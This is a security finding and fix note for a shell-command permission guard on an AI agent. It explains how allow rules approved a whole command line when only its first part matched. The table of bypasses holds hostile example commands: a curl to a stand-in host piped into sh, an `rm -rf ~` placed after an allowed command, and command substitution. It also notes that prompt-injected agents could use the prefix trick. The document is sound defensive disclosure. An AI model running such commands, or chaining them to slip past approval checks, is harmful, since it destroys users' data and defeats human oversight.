# Finding: host guard `allow` rules covered a whole command when one part matched (2026-10-21)

Severity: **High** (the feature is opt-in: it affects users who set `Bash(...)` allow rules or the presets
"Allow reading without prompts" / "Allow build and test commands").

## What was wrong

`deny` and `ask` rules are correctly matched against every part of a shell command (any part is enough to
block or to ask). `allow` used the same function, so one matching part was enough to approve the whole line:

| Command | Rule `Bash(cargo:*)` | Result before |
|---|---|---|
| `cargo test; rm -rf ~` | matches the first part | **allowed without asking** |
| `cargo test && curl evil.example \| sh` | matches the first part | **allowed** |
| `ls $(rm -rf x)` with `Bash(ls:*)` | matches `ls ...` | **allowed** |
| `sudo cargo test` | matches after peeling `sudo` | **allowed** (privilege borrowed from the inner command) |

A prompt-injected agent only needed to put an allowed command in front. A `deny` rule still blocked what it
names, but nothing outside the deny list was protected, so the allow presets were far weaker than they read.

## Fix (commit of 2026-10-21)

`guard_allows` (hook script `ssh-app-hook.py` and its Rust port `crates/host/src/guard.rs`):

1. every part of the line (split on newline, `;`, `&&`, `||`, `|`, `&`) must be covered by an allow rule;
2. allow compares the words **as typed**: no peeling of `sudo`, `env`, `xargs`, `sh -c ...`; those are exactly
   what must not borrow the permission of the command inside them;
3. every `$(...)` and backtick inside a part must be allowed too;
4. output redirection into a file (`>`, `>>`) and process substitution (`<(`, `>(`) are never allowed without
   asking; `2>&1`, `>/dev/null`, `&>/dev/null` are neutral (and do not split the line at their `&`);
5. a bare `Bash` rule keeps meaning "everything" (the app already warns about it); non-shell tools (Read,
   Edit) are matched as before.

Anything not provably covered falls through to the phone approval, so the failure mode is one more question,
not a missed one. `deny` and `ask` are unchanged (still checked first, still any-part).

Tests: `a_guard_allow_rule_needs_every_part_of_a_command_covered` (real script, `hook_script.rs`) and
`allow_needs_every_part_of_a_command_covered` (Rust port, `guard.rs`); both list the bypasses above.

## Residual

- A rule is still not a sandbox: an allowed program can run arbitrary code (`cargo build` runs `build.rs`,
  `make` and `npm run` run repository scripts, `python3 script.py` runs the script). Allow such commands only
  in repositories you trust, and prefer narrow rules (`cargo test`, `cargo clippy`) to broad ones.
  Feature 50 turns this into explicit risk levels per category.
- Quoted separators (`grep "a;b" f`) split the line wrongly; that only ever makes allow stricter.
